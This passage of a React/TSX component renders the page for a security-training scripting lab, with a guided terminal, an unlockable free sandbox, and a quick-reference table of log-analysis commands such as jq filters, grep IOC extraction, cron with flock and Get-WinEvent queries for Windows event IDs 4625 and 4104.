              'jq paths & select()',
              'IOC extraction with grep -oE',
              'Bash for / while loops',
              'set -euo pipefail',
              'File permissions & ./',
              'Python base64 decoding',
              'SHA-256 with hashlib',
              'venv & PEP 668',
              'pip & dependency pinning',
              'argparse CLIs & exit codes',
              'cron scheduling & flock',
              'Get-WinEvent -FilterHashtable',
              'Event IDs 4625 / 4104',
              'Script Block Logging',
            ].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#9a8a4a', background: 'rgba(255,209,102,0.06)', border: '1px solid rgba(255,209,102,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="scripting-lab"
          moduleId={moduleId}
          title="Automate the Night Shift"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
          onRestart={() => { setGuidedDone(false); setFreeLaunched(false); setEarnedXp(0) }}
        />
      </div>

      {/* ── PHASE 2: Free Lab ── */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(255,209,102,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(255,209,102,0.4)' : '#3a3a1a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#5a5a2a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#9a8a4a' : '#5a5a2a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 — FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#5a5a2a' }}>Scripting Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(255,209,102,0.04)' : '#060602', border: '1px solid ' + (guidedDone ? 'rgba(255,209,102,0.25)' : '#1a1a0a'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && (
              <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />
            )}
            <div style={{ fontSize: '7px', color: guidedDone ? '#7a7a3a' : '#3a3a1a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR FREE PRACTICE' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#5a5a2a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#7a7a4a', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox — no guided prompts, no restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap' as const, marginBottom: '2rem' }}>
              {[
                'Log pipelines',
                'jq filters',
                'Bash loops & functions',
                'Python one-liners',
                'cron syntax',
                'PowerShell event queries',
              ].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#3a3a1a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#9a8a4a' : '#3a3a1a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{
                fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em',
                padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(255,209,102,0.6)' : '#3a3a1a'),
                borderRadius: '6px', background: guidedDone ? 'rgba(255,209,102,0.12)' : 'transparent',
                color: guidedDone ? accent : '#3a3a1a', cursor: guidedDone ? 'pointer' : 'not-allowed',
                boxShadow: guidedDone ? '0 0 24px rgba(255,209,102,0.18)' : 'none', transition: 'all 0.2s',
              }}
            >
              {guidedDone ? '▸ LAUNCH FREE LAB ENVIRONMENT' : 'COMPLETE THE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && (
              <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#3a3a1a' }}>
                Complete all {steps.length} guided steps above to unlock the free lab environment
              </div>
            )}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080802' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#0a0a03', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#7a7a3a' }}>
                Free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) to explain any pipeline, script or PowerShell query.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button
          onClick={() => setShowKeywords(!showKeywords)}
          style={{ background: 'transparent', border: '1px solid #3a3a1a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#7a7a3a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0, transition: 'all 0.15s' }}
        >
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE — SCRIPTING COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#0a0a03', border: '1px solid #1f1f0d', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: '8px' }}>
              {[
                ['grep -c "pattern" file', 'Count matching lines'],
                ["awk '{print $(NF-3)}'", 'Print 4th field from the end'],
                ['sort | uniq -c | sort -nr | head', 'Top N by frequency'],
                ["cut -d',' -f3 file.csv", 'Third CSV column'],
                ["jq -r '.source.ip' alert.json", 'Raw value from nested JSON'],
                [`jq '.[] | select(.severity == "high")'`, 'Filter a JSON array'],
                ["grep -oE '[0-9]{1,3}([.][0-9]{1,3}){3}'", 'Extract IPv4 candidates'],
                ['while IFS= read -r line; do ...; done < file', 'Safe line-by-line loop'],
                ['set -euo pipefail', 'Bash strict mode'],
                ['chmod +x script.sh && ./script.sh', 'Make executable and run'],
                ['shellcheck script.sh', 'Lint a Bash script'],
                [`python3 -c "import base64; print(base64.b64decode('...').decode())"`, 'Decode base64'],
                [`python3 -c "import hashlib; print(hashlib.sha256(b'x').hexdigest())"`, 'SHA-256 of bytes'],
                ['python3 -m venv .venv && source .venv/bin/activate', 'Create and enter a venv'],
                ['pip install -r requirements.txt', 'Install pinned dependencies'],
                ['*/15 * * * * /path/job.sh >> /var/log/job.log 2>&1', 'cron: every 15 minutes'],
                ['flock -n /run/lock/job.lock /path/job.sh', 'Prevent overlapping runs'],
                ["Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}", 'Failed Windows logons'],
                ["Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104}", 'PowerShell script blocks'],
                ['Get-Process | Get-Member', 'Discover object properties'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060602', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.7rem', flexShrink: 0, maxWidth: '60%', overflowWrap: 'anywhere' as const }}>{cmd}</code>
                  <span style={{ color: '#7a7a4a', fontSize: '0.68rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #1f1f0d', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap' as const, gap: '10px' }}>
        <Link href="/modules/scripting" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#7a7a3a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#7a7a3a' }}>ALL MODULES &#8594;</Link>
      </div>
    </div>
  )
}
